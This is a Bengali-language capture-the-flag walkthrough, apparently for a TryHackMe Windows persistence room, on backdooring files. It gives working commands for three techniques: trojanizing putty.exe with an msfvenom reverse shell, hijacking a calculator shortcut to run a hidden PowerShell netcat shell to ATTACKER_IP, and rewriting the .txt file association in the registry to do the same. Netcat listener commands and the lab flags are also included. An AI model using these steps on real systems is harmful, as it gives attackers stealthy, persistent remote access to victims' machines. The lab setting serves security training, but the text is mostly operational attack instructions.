# 📁 টাস্ক ৩: ফাইল ব্যাকডোরিং (Backdooring Files)

**ধারণা:** ব্যবহারকারী নিয়মিত যে ফাইল বা শর্টকাট ব্যবহার করে, সেগুলোতে পরিবর্তন এনে লুকিয়ে ব্যাকডোর স্থাপন করা। ফাইলটি স্বাভাবিকভাবে কাজ করবে, কিন্তু পেছনে পেছনে হ্যাকারকে রিমোট অ্যাক্সেস দিয়ে দেবে।

এই টাস্কে তিনটি পদ্ধতি আলোচনা করা হয়েছে:
1.  এক্সিকিউটেবল ফাইল (Executable Files) পরিবর্তন
2.  শর্টকাট ফাইল (Shortcut Files) হাইজ্যাক
3.  ফাইল অ্যাসোসিয়েশন (File Associations) হাইজ্যাক

---

## পার্ট ১: এক্সিকিউটেবল ফাইল ব্যাকডোরিং (Executable Files)

**কৌশল:** ব্যবহারকারীর ব্যবহৃত `.exe` ফাইলটি (যেমন `putty.exe`) ডাউনলোড করে তাতে ম্যালওয়্যার (পেলোড) ঢুকিয়ে পুনরায় স্থাপন করা।

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | টার্গেট মেশিন থেকে `putty.exe` অ্যাটাকার মেশিনে ডাউনলোড করো। | |
| ২ | `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=<ATTACKER_IP> lport=4444 -b "\x00" -f exe -o putty.exe` | **-x:** মূল ফাইলটি টেমপ্লেট হিসেবে ব্যবহার।<br>**-k:** মূল ফাইলের থ্রেড অক্ষুণ্ণ রেখে নতুন পেলোড থ্রেড যোগ করা।<br>ফলাফল: ফাইলটি ওপেন করলে পুটি-ও চালু হবে এবং রিভার্স শেল-ও যাবে। |
| ৩ | ব্যাকডোরকৃত `putty.exe` টার্গেট মেশিনে আপলোড করে রিপ্লেস করো। | |
| ৪ | অ্যাটাকার মেশিনে লিসেনার চালু করো: `nc -lvp 4444` | |
| ৫ | ব্যবহারকারী যখন পুটি চালু করবে, তুমি শেল পেয়ে যাবে। | এই পদ্ধতি এক্সিকিউটেবল ফাইল পরিবর্তনের কারণে কিছু অ্যান্টিভাইরাসে ধরা পড়তে পারে। |

## পার্ট ২: শর্টকাট ফাইল হাইজ্যাকিং (Shortcut Files)

**কৌশল:** এক্সিকিউটেবল ফাইল না বদলে, শুধু শর্টকাটের টার্গেট পরিবর্তন করে একটি স্ক্রিপ্ট চালানো যা প্রথমে ব্যাকডোর দেয়, তারপর মূল প্রোগ্রাম চালু করে।

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | `C:\Windows\System32\backdoor.ps1` নামে একটি পাওয়ারশেল স্ক্রিপ্ট তৈরি করো: | |
| | `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"`<br>`C:\Windows\System32\calc.exe` | প্রথম লাইন: নেটক্যাট দিয়ে রিভার্স শেল পাঠায়।<br>দ্বিতীয় লাইন: ব্যবহারকারীকে ক্যালকুলেটর দেখায় (সন্দেহ এড়াতে)। |
| ২ | ক্যালকুলেটরের শর্টকাটে রাইট ক্লিক → Properties → Shortcut ট্যাব। | |
| ৩ | Target ফিল্ডে লিখো:<br>`powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1` | `-WindowStyle hidden` দিয়ে পাওয়ারশেল উইন্ডো লুকানো থাকে। |
| ৪ | Change Icon বাটনে ক্লিক করে আইকনটি পুনরায় `C:\Windows\System32\calc.exe` থেকে সিলেক্ট করো। | আইকন ঠিক থাকলে ব্যবহারকারী সন্দেহ করবে না। |
| ৫ | অ্যাটাকার মেশিনে লিসেনার চালু করো: `nc -lvp 4445` | |
| ৬ | ব্যবহারকারী শর্টকাটে ক্লিক করলেই তুমি শেল পাবে এবং সে ক্যালকুলেটর দেখতে পাবে। | |
| ৭ | `C:\flags\flag5.exe` রান করো। | **ফ্ল্যাগ ৫:** `THM{NO_SHORTCUTS_IN_LIFE}` |

## পার্ট ৩: ফাইল অ্যাসোসিয়েশন হাইজ্যাকিং (Hijacking File Associations)

**কৌশল:** উইন্ডোজ যখন কোনো ফাইল (যেমন `.txt`) ওপেন করে, তখন রেজিস্ট্রি দেখে কোন প্রোগ্রাম চালাবে। এই রেজিস্ট্রি ভ্যালু পরিবর্তন করে নোটপ্যাডের বদলে আমাদের স্ক্রিপ্ট চালানো।

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | `C:\Windows\backdoor2.ps1` নামে পাওয়ারশেল স্ক্রিপ্ট তৈরি করো: | |
| | `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"`<br>`C:\Windows\system32\NOTEPAD.EXE $args[0]` | `$args[0]` হলো সেই `.txt` ফাইলটি যা ইউজার খুলতে চেয়েছিল। স্ক্রিপ্টটি নোটপ্যাডে ফাইলটি খুলে দেবে। |
| ২ | রেজিস্ট্রি এডিটর খুলে নিচের পাথে যাও:<br>`HKLM\SOFTWARE\Classes\txtfile\shell\open\command` | `.txt` ফাইলের জন্য ডিফল্ট প্রোগ্রাম কোনটি সেটা এখানে সংরক্ষিত থাকে। |
| ৩ | `(Default)` ভ্যালুটি পরিবর্তন করে লিখো:<br>`powershell -windowstyle hidden C:\windows\backdoor2.ps1 %1` | `%1` হলো ফাইল নেমের ভ্যারিয়েবল যা স্ক্রিপ্টে `$args[0]` হিসেবে পাস হয়। |
| ৪ | অ্যাটাকার মেশিনে লিসেনার চালু করো: `nc -lvp 4448` | |
| ৫ | ভিক্টিম মেশিনে যেকোনো `.txt` ফাইল ওপেন করো। | তুমি সাথে সাথে রিভার্স শেল পেয়ে যাবে, আর ইউজার নোটপ্যাডে ফাইলটি দেখতে পাবে। |
| ৬ | `C:\flags\flag6.exe` রান করো। | **ফ্ল্যাগ ৬:** `THM{TXT_FILES_WOULD_NEVER_HURT_YOU}` |

| **শর্টকাট হাইজ্যাক** | মূল ফাইল অক্ষুণ্ণ থাকে, সহজে রিভার্ট করা যায় | পাওয়ারশেল উইন্ডো এক সেকেন্ডের জন্য ফ্ল্যাশ করতে পারে | দ্রুত ব্যাকডোর দরকার কিন্তু ফাইল মডিফাই করা যাবে না |
